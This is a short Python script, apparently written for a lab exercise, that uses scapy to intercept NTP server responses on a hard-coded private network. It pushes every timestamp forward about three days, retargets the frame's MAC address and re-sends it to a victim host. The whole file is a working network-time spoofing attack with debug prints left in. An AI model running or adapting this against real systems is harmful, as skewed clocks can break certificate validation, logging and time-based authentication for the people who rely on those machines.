from scapy.all import IP, UDP, NTP, send, sniff, Ether
from scapy.layers.ntp import NTP
import time, datetime
import os


server_ip = "10.10.10.12"
victim_ip = "10.10.10.10"
#all these values are hard coded for the sake of this exercise
def send_ntp(server, packet):
    print('here')
    ntp_packet = packet
    del ntp_packet[UDP].chksum
    print("incoming packet")
    #ntp_packet.show()
    print()

    ntp_packet[NTP].ref = ntp_packet[NTP].ref + 259201
    ntp_packet[NTP].orig = ntp_packet[NTP].ref + 259201
    ntp_packet[NTP].recv = ntp_packet[NTP].ref + 259201
    ntp_packet[NTP].sent = ntp_packet[NTP].ref + 259201
    ntp_packet[Ether].dst = "4e:c1:60:9c:84:bc"

    #ip_packet = IP(src=server, dst=dest_ip)
    #udp_packet = UDP(dport=123, sport=123)
    print("Packet before sending")
    ntp_packet.show()
    #if ntp_packet.haslayer(UDP):
    #    print("new checksum: " + str(ntp_packet[UDP].chksum))
    #else:
    #    print("Packet does not contain UDP layer")
    ntp_packet = ntp_packet.build()
    send(ntp_packet, verbose=True)


def ntp_request(packet):
    print('here')
    ntp_layer = packet.getlayer(NTP)
    if ntp_layer and ntp_layer.mode == 4:
        send_ntp(victim_ip, packet)

if __name__ == "__main__":
    print('here')
    sniff(filter="udp and port 123", prn=ntp_request)
